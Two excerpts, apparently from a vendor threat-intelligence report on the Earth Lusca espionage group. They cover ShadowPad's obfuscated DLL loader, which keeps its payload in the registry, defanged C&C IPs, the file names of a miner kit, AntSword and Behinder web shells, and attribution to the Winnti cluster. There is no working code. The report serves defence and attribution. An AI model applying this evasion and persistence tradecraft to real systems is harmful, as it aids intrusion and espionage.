While it was initially used solely by APT41, it started being shared among multiple Chinese](https://securelist.com/operation-shadowhammer-a-high-profile-supply-chain-attack/90380/)\nthreat actors in 2019.\n\nIn the case of Earth Lusca, the malware has the same features, but they added an extra layer of\nobfuscation, making it very different from the Shadowpad samples used by other groups.\n\nIn this case, the ShadowPad samples are composed of three components: a valid code signed\nexecutable, a DLL loader, and an encrypted payload.\n\n[The obfuscation technique used by ShadowPad has previously been described: a function is called](https://www.pwc.co.uk/issues/cyber-security-services/research/chasing-shadows.html)\nbefore each instruction, which will redirect the code flow to the next instruction, making it very difficult to\nfollow. In addition, some useless comparisons are added to overload the code.\n\nThe DLL loader is obfuscated. Its role is to search and load the payload file, which is obfuscated in the\nsame manner as the DLL file. If the payload file is found, its code is copied to the registry and the file is\ndeleted. The next time it runs, the payload will be loaded from the registry. This way, it is not possible to\nrecover the final payload using only the DLL loader and without the registry content. Some of the\ndecrypted configurations we found contained the “mm_telecom” keyword, which might indicate a possible\ntarget.\n\nWe have seen ShadowPad samples dropped by Cobalt Strike infections distributed by Earth Lusca to its\nvictims.\n\nWe observed the same behavior for ShadowPad C&C servers that move rapidly.\n\nDate IP ISP\nMay 18, 2021 139.180.135[.]175 Vultr – German\nJul 20, 2021 207.148.76[.]26 Vultr – Singapore\nAug 31, 2021 149.28.156[.]173 Vultr – Singapore\nSep 7, 2021 156.240.107[.]248 UDC – Hong Kong\nTable 4.

The shell script to launch the cryptocurrency miner\n\n  - by.bat – XMR installation Scripts\n\n  - ok.txt – Victim machine lists\n\n  - pwm.exe – XMR Miner\n\n  - wmi.vbs – WMI EXEC Vbscript\n\nFurther analysis shows that the threat actors install the miner on the victim’s machine to earn money. At\nfirst glance, the revenue earned from the mining activities seem low. However, it also shows the victim’s\nActive Directory being compromised.\n\nFigure 21. The cryptocurrency miner’s dashboard\n\n\n-----\n\n#### Others\n\nBased on the information we found in the GitHub repository, we know that Earth Lusca uses multiple web\nshells that are written in several languages such as JSP, PHP, Perl, C# and ASPX. Despite their\ndifferences, these web shells are all designed to get the job done.\n\nThe following subsections will briefly cover a couple of web shell management tools that the group uses.\n\n##### AntSword\n\nAntSword is a successor of the China Chopper web shell that integrates more features compared to other\nweb shell management tools. Perhaps its unique selling point is its plugin store, where a user can\nenhance its functions via additional plugins.\n\nFigure 22. AntSword’s plugin store\n\n##### Behinder\n\n\n-----\n\nBehinder is a web shell management toolkit that encrypts traffic — making it stand out from other web\nshell management tools, Encrypted payloads are more difficult for web application firewalls or intrusion\nprevention systems to discover.\n\nFigure 23.The Behinder UI\n\n## Attribution\n\n[In January 2020, ESET reported a new campaign targeting universities in Hong Kong with both Winnti](https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/)\nand a new ShadowPad variant. On May 21, 2020, few domains related to the same cluster of\n[infrastructure used in this campaign were listed as the indicators in an FBI alert](https://web.archive.org/web/20210421041924/https:/www.alaha.org/wp-content/uploads/2020/05/Cyber-Alert.pdf) mentioning that nationstate threat actors were targeting US organizations conducting Covid-19 research.\n\n[Positive Technologies released a report sharing the analysis of a new malware called FunnySwitch,](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/)\nwhich possibly originated from the same developers of the Crosswalk malware: the C&C domains of\n[FunnySwitch could connect to the infrastructure of the same campaign. Another report released by](https://news.drweb.com/show/?i=14154)\nDr.WEB in March 2021 identified another malware called Spyder, which also used the same associated\nC&C infrastructure.\n\n[In April 2021, the NTT Group published a report](https://hello.global.ntt/-/media/ntt/global/insights/white-papers/the-operations-of-winnti-group.pdf) of a campaign that deployed Cobalt Strike and Acunitex\non compromised GlassFish servers to perform targeted attacks. The report addressed the activity\noverlaps with aforementioned ESET and Dr.WEB’s reports. A few months later, in July 2021, Avast\n[reported that the website](https://decoded.avast.io/luigicamastra/backdoored-client-from-mongolian-ca-monpass/) of a Mongolian certification authority was compromised to distribute Cobalt\nStrike binaries associated with the indicators described in the NTT Group’s report. Recorded Future\nreported the same cluster of activity later on and gave a temporary name to this campaign (TAG-22).\n\nIn July 2021, we published a report on a new malware called BIOPASS RAT. The malware was loaded by\nloaders that have the same PDB string reported in both the NTT Group and Avast’s reports.\n\n\n-----\n\n[More recently, PwC published an extensive analysis of the ShadowPad variant (32 bit version) that Earth](https://www.pwc.co.uk/issues/cyber-security-services/research/chasing-shadows.html)\nLusca used.\n\nFigure 24. Research and reports related to Earth Lusca\n\nThe earlier research done on these activities initially attributed it to the Winnti Group since the malware\nused in the campaigns included Winnti and ShadowPad (reported to be associated with the Winnti\nGroup). As more details emerged, however, it became clear that the TTP and the infrastructure differ from\nthose used by any subcluster under the Winnti umbrella.\n\nMore [recent reports](https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/) consider it to be another cluster of activities under the name TAG-22 or Fishmonger.\nWe decided to separate the cluster as an independent campaign and named it Earth Lusca.\n\nThe term Winnti has evolved since it first hit public consciousness in 2013. While it was initially\ndesignated as both a tool and its associated threat actor, the research community has begun to consider\nthe term “Winnti” as one that no longer refers to a single threat actor, but encompasses several different\ngroups originating from the same country and possibly sharing parts of their code, tools and TTP.\n\nWe can conclude with medium confidence that Earth Lusca is part of the Winnti cluster, but we prefer to\nstate the facts and consider it as a single threat actor.\n\n## Conclusion\n\nEarth Lusca is a cyberespionage campaign that targets high value organizations around the world via\nspear phishing or watering hole attacks using tried and true social engineering techniques. One of their\nmotivations is financial gain, as evidenced by their targeting of gambling and cryptocurrency companies.\nFurthermore, the group also targets public-facing servers through the exploitation of known vulnerabilities\nin servers that are running out-of-date versions of applications. Earth Lusca also used vulnerability\nscanning tools to discover possible vulnerabilities inside the websites of targeted victims.\n\n\n-----\n\nThe infection vectors used by the group shows the importance of applying security best practices such as\nproper vetting of emails and websites being visited, as well as constantly updating software to their latest\nsecurity iterations to minimize the chances of vulnerability exploitation.\n\n[Furthermore, advanced and versatile security technologies such as Trend Micro XDR](https://www.trendmicro.com/en_ph/business/products/detection-response/xdr.html) can help defend\norganizations from threat actors such as Earth Lusca by collecting and correlating activity data across\nmultiple vectors — from emails and endpoints to servers, cloud workloads, and networks — enabling a\nlayer of security detection and investigation that cannot be matched by traditional security solutions.\n\n### Appendix A.
